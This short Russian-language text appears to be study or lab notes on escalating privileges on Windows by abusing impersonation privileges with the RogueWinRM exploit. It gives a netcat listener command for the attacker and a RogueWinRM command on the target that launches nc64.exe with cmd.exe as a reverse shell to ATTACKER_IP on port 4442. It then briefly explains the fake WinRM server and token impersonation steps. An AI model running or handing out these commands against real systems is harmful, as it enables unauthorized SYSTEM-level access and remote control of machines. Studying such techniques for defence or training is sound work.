# Привелегии позволяют процессу выдавать себя за других пользователей и действовать от их имени.

# Для повышения привилегий с помощью таких учетных записей злоумышленнику необходимо следующее: 1. Запустить процесс, к которому пользователи смогут подключиться и пройти аутентификацию для осуществления подмены личности. 2. Найти способ заставить привилегированных пользователей подключиться и пройти аутентификацию в запущенном вредоносном процессе.

# Для выполнения обоих условий мы воспользуемся эксплойтом RogueWinRM.

Атакующая машина:
nc -lvp 4442

Целевая машина:

c:\tools\RogueWinRM\RogueWinRM.exe -p "C:\tools\nc64.exe" -a "-e cmd.exe ATTACKER_IP 4442"


# Вот что делает команда:

Создаёт "поддельный" WinRM сервер на стандартном порту 5985

Ждёт подключения привилегированного пользователя или системы

Когда кто-то подключается к WinRM (например, планировщик задач или администратор)

Выполняет подмену токена (token impersonation)

Запускает указанную команду с привилегиями подключившегося пользователя
